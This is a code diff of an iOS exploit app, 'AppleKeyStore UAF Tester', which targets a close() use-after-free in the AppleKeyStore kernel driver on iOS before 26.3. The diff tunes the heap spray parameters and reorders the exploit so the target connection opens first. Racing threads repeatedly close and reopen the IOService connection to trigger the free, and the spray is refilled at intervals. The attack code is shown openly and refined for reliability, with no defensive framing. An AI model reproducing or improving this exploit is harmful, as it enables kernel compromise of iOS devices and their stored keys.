@@ -2,7 +2,7 @@
 //  ViewController.m
 //  UAFTester
 //
-//  v4 - Fixed for Xcode 26.2 strict compilation
+//  v6 - PROGRAMMATIC UI + FIXED ORDER
 //
 
 #import "ViewController.h"
@@ -18,9 +18,9 @@
 #define MAX_ATTEMPTS 5000
 
 // ========== HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         1000
+#define SPRAY_COUNT         200   // Reduced to leave resources for target
 #define SPRAY_BUFFER_SIZE   1024
-#define SPRAY_DELAY_MS      50
+#define SPRAY_DELAY_MS      30
 #define REFILL_INTERVAL     10
 // ==============================================
 
@@ -153,7 +153,7 @@ static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), B
     if (!is_refill) {
         log_callback(@"");
         log_callback(@"╔══════════════════════════════════════════════════╗");
-        log_callback(@"║           HEAP SPRAY v4 - IMPROVED               ║");
+        log_callback(@"║           HEAP SPRAY v6 - PROGRAMMATIC UI        ║");
         log_callback(@"╚══════════════════════════════════════════════════╝");
         log_callback([NSString stringWithFormat:@"Target connections: %d", SPRAY_COUNT]);
         log_callback([NSString stringWithFormat:@"Structure size: %zu bytes", sizeof(fake_gate_t)]);
@@ -239,8 +239,8 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
 // ================================================================
 
 @interface ViewController ()
-@property (weak, nonatomic) IBOutlet UITextView *textView;
-@property (weak, nonatomic) IBOutlet UIButton *testButton;
+@property (nonatomic, strong) UITextView *textView;      // Changed from IBOutlet to strong
+@property (nonatomic, strong) UIButton *testButton;      // Changed from IBOutlet to strong
 @property (nonatomic, strong) NSMutableString *logBuffer;
 @end
 
@@ -248,9 +248,87 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
 
 - (void)viewDidLoad {
     [super viewDidLoad];
+    
+    // Set background
+    self.view.backgroundColor = [UIColor blackColor];
+    
+    // Create UI programmatically
+    [self setupUI];
+    
+    // Initialize log
     self.logBuffer = [NSMutableString string];
-    [self appendLog:@"UAF Tester v4 - Improved Ready"];
-    [self appendLog:@"Changes: Better timing, larger spray, adaptive refill"];
+    [self appendLog:@"═══════════════════════════════════════"];
+    [self appendLog:@"  UAF Tester v6 - Programmatic UI"];
+    [self appendLog:@"═══════════════════════════════════════"];
+    [self appendLog:@"Ready to test!"];
+    [self appendLog:@"Tap TRIGGER button to start"];
+}
+
+- (void)setupUI {
+    // Title label
+    UILabel *titleLabel = [[UILabel alloc] init];
+    titleLabel.text = @"AppleKeyStore UAF Tester";
+    titleLabel.font = [UIFont boldSystemFontOfSize:20];
+    titleLabel.textColor = [UIColor whiteColor];
+    titleLabel.textAlignment = NSTextAlignmentCenter;
+    titleLabel.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.view addSubview:titleLabel];
+    
+    // Subtitle label
+    UILabel *subtitleLabel = [[UILabel alloc] init];
+    subtitleLabel.text = @"iOS <26.3 RC - close() UAF";
+    subtitleLabel.font = [UIFont systemFontOfSize:14];
+    subtitleLabel.textColor = [UIColor lightGrayColor];
+    subtitleLabel.textAlignment = NSTextAlignmentCenter;
+    subtitleLabel.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.view addSubview:subtitleLabel];
+    
+    // Test button
+    self.testButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    [self.testButton setTitle:@"TRIGGER UAF" forState:UIControlStateNormal];
+    [self.testButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
+    self.testButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
+    self.testButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
+    self.testButton.layer.cornerRadius = 10;
+    [self.testButton addTarget:self action:@selector(runTest:) forControlEvents:UIControlEventTouchUpInside];
+    self.testButton.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.view addSubview:self.testButton];
+    
+    // Text view for logs
+    self.textView = [[UITextView alloc] init];
+    self.textView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
+    self.textView.textColor = [UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0];
+    self.textView.font = [UIFont fontWithName:@"Menlo" size:11];
+    self.textView.editable = NO;
+    self.textView.layer.cornerRadius = 8;
+    self.textView.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.view addSubview:self.textView];
+    
+    // Layout constraints
+    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
+    [NSLayoutConstraint activateConstraints:@[
+        // Title
+        [titleLabel.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
+        [titleLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
+        [titleLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
+        
+        // Subtitle
+        [subtitleLabel.topAnchor constraintEqualToAnchor:titleLabel.bottomAnchor constant:8],
+        [subtitleLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
+        [subtitleLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
+        
+        // Button
+        [self.testButton.topAnchor constraintEqualToAnchor:subtitleLabel.bottomAnchor constant:24],
+        [self.testButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
+        [self.testButton.widthAnchor constraintEqualToConstant:240],
+        [self.testButton.heightAnchor constraintEqualToConstant:50],
+        
+        // TextView
+        [self.textView.topAnchor constraintEqualToAnchor:self.testButton.bottomAnchor constant:20],
+        [self.textView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
+        [self.textView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
+        [self.textView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
+    ]];
 }
 
 - (void)appendLog:(NSString *)msg {
@@ -264,22 +342,24 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     NSLog(@"%@", msg);
 }
 
-- (IBAction)runTest:(id)sender {
+- (void)runTest:(id)sender {
     self.testButton.enabled = NO;
+    self.testButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:1.0];
     [self.logBuffer setString:@""];
     [self appendLog:@"═══════════════════════════════════════"];
-    [self appendLog:@"  UAF Test v4 - IMPROVED STRATEGY"];
+    [self appendLog:@"  UAF Test v6 - PROGRAMMATIC UI"];
     [self appendLog:@"═══════════════════════════════════════"];
     
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        [self runImprovedUAF];
+        [self runFixedUAF];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.testButton.enabled = YES;
+            self.testButton.backgroundColor = [UIColor colorWithRed:0.8 green:0.0 blue:0.0 alpha:1.0];
         });
     });
 }
 
-- (void)runImprovedUAF {
+- (void)runFixedUAF {
     io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                                                     IOServiceMatching(AKS_SERVICE));
     if (!svc) {
@@ -292,31 +372,39 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     atomic_store(&g_errors, 0);
     atomic_store(&g_should_stop, 0);
     
+    // ========== CRITICAL FIX: Open target connection FIRST ==========
     [self appendLog:@""];
-    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
+    [self appendLog:@">>> PHASE 1: OPEN TARGET CONNECTION"];
+    
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
+    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
+        [self appendLog:@"❌ Failed to open target connection"];
+        IOObjectRelease(svc);
+        return;
+    }
+    
+    [self appendLog:@"[✓] Target connection opened"];
+    [self appendLog:[NSString stringWithFormat:@"[✓] Connection handle: 0x%x", g_conn]];
+    // ================================================================
+    
+    // ========== NOW spray with remaining resources ==========
+    [self appendLog:@""];
+    [self appendLog:@">>> PHASE 2: HEAP SPRAY"];
     
     int spray_result = heap_spray_phase(svc, ^(NSString *msg) {
         [self appendLog:msg];
     }, NO);
     
-    if (spray_result < 100) {
+    if (spray_result < 50) {
         [self appendLog:@"❌ Heap spray failed - insufficient objects"];
+        IOServiceClose(g_conn);
         IOObjectRelease(svc);
         return;
     }
+    // ========================================================
     
     [self appendLog:@""];
-    [self appendLog:@">>> PHASE 2: UAF TRIGGER (ADAPTIVE)"];
-    
-    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
-    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
-        [self appendLog:@"❌ Failed to open target connection"];
-        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
-        IOObjectRelease(svc);
-        return;
-    }
-    
-    [self appendLog:@"[UAF] Target connection opened"];
+    [self appendLog:@">>> PHASE 3: UAF TRIGGER"];
     
     pthread_t threads[NUM_RACERS];
     for (int i = 0; i < NUM_RACERS; i++) {
@@ -332,15 +420,18 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
             break;
         }
         
+        // Refill spray periodically
         if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
             heap_spray_phase(svc, ^(NSString *msg) {
                 // Silent refill
             }, YES);
         }
         
+        // Close target connection
         kr = IOServiceClose(g_conn);
         usleep(1);
         
+        // Reopen - this is the UAF window
         kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
         if (kr != KERN_SUCCESS) {
             [self appendLog:@"[UAF] Reopen failed - possible trigger!"];
